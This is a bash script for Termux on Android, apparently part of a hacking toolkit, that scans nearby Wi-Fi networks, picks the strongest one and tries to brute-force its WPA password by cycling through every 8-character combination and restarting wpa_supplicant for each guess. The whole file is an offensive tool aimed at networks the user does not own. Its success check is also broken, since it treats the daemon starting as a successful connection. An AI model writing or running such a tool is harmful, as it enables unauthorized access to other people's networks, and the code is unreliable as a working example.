#!/data/data/com.termux/files/usr/bin/bash

clear
FONT_GREEN="\e[32m"
FONT_RESET="\e[0m"
art=$(<$HOME/fardo-sec/art/wifi.txt)

echo "$art"
read -p "Press ENTER to continue..."

for i in {3..1}; do
    for ((j=0; j<4; j++)); do
        clear
        if [ $((j % 2)) -eq 0 ]; then
            echo -e "${FONT_RESET}$art"
        else
            echo -e "${FONT_GREEN}$art${FONT_RESET}"
        fi
        sleep 0.$i
    done
done

termux-wifi-enable true
wifi_info=$(termux-wifi-scaninfo)

min_rssi=-100
min_ssid=""
for row in $(echo "${wifi_info}" | jq -c '.[]'); do
    ssid=$(echo "${row}" | jq -r '.ssid')
    rssi=$(echo "${row}" | jq -r '.rssi')
    if [ "${rssi}" -gt "${min_rssi}" ]; then
        min_rssi="${rssi}"
        min_ssid="${ssid}"
    fi
done

characters="0123456789qwertyuiopasdfghjklçzxcvbnmQWERTYUIOPASDFGHJKLÇZXCVBNM,.<>;/:?°~]^}º´\`[{ª-_=+§)(*&¨%\$#@!¹²³£¢¬\\|"

min_length=8

generate_combinations() {
    local prefix="$1"
    local remaining_length="$2"

    if [ "$remaining_length" -eq 0 ]; then
        echo "$prefix"
        return
    fi

    for ((i = 0; i < ${#characters}; i++)); do
        local current_char="${characters:i:1}"
        generate_combinations "$prefix$current_char" $((remaining_length - 1))
    done
}

echo "Connecting to $min_ssid..."

while IFS= read -r senha; do
    cat > /data/misc/wifi/wpa_supplicant.conf <<EOF
    ctrl_interface=/data/misc/wifi/wpa_supplicant
    ctrl_interface_group=1010
    update_config=1
    ap_scan=1

    network={
        ssid="$min_ssid"
        psk="$senha"
        key_mgmt=WPA-PSK
    }
EOF

    killall wpa_supplicant
    wpa_supplicant -B -i wlan0 -c /data/misc/wifi/wpa_supplicant.conf
    if [ $? -eq 0 ]; then
        echo "Connected to $min_ssid."
        break
    fi
done < <(generate_combinations "" $min_length)